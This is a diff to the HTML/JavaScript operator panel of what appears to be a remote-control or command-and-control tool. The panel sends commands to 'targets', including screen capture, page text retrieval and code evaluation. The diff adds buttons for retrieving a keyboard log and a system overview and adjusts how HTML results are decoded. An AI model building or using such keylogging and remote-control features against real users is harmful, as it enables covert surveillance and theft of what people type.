@@ -102,6 +102,8 @@
         <a href="javascript:void(0);" onclick="writeMessage(createBuiltInCmd('SendTestMessage'));">SendTestMessage</a><br/>
         <a href="javascript:void(0);" onclick="writeMessage(createBuiltInCmd('GetFrontendUrls'));">GetFrontendUrls</a><br/>
         <a href="javascript:void(0);" onclick="writeMessage(createBuiltInCmd('GetScreenCapture'))">GetScreenCapture</a><br/>
+        <a href="javascript:void(0);" onclick="writeMessage(createBuiltInCmd('GetKeyboardLog'))">GetKeyboardLog</a><br/>
+        <a href="javascript:void(0);" onclick="writeMessage(createBuiltInCmd('GetSystemOverview'))">GetSystemOverview</a><br/>
     </div>
 
     <br/>
@@ -475,11 +477,17 @@
                 let targets = message.result;
                 refreshTargets(targets);
 
-            } else if ( message.builtincmd == 'GetTargetText' || message.builtincmd == 'GetTargetHTML' || message.builtincmd == 'ExecEvaluate' ) {
+            } else if ( message.builtincmd == 'GetTargetText' || message.builtincmd == 'ExecEvaluate' ) {
                 let result = message.result;
                 result = atob(result);
                 
                 LogMsg('result length: '+result.length);
+                
+                let elem = document.getElementById('cmdResult');
+                elem.value = result;
+            
+            } else if ( message.builtincmd == 'GetTargetHTML' ) {
+                let result = message.result;
                 
                 let elem = document.getElementById('cmdResult');
                 elem.value = result;
